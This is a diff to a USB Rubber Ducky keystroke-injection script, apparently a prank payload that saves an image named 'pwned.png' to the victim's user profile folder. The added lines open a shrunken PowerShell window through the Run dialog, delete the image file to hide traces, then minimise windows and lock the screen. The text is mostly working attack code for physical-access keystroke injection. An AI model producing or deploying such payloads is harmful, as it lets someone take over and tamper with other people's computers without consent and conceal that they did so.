@@ -12,7 +12,7 @@ ENTER
 DELAY 1500
 CTRL s
 DELAY 800
-STRING %userprofile%\downloads\pwned.png
+STRING %userprofile%\pwned.png
 ENTER
 DELAY 500
 CTRL W
@@ -33,9 +33,24 @@ TAB
 DELAY 800
 ENTER
 DELAY 600
-STRING %userprofile%\downloads\pwned.png
+STRING %userprofile%\pwned.png
 ENTER
 DELAY 1000
+ALT F4
+DELAY 200
+GUI r
+DELAY 100
+STRING powershell -noexit -command "mode con cols=15 lines=1"
+ENTER
+DELAY 600
+STRING Remove-Item 'pwned.png'
+DELAY 100
+ENTER
+DELAY 600
+STRING exit
+DELAY 100
+ENTER
+DELAY 100
 GUI M
 DELAY 500
 GUI L
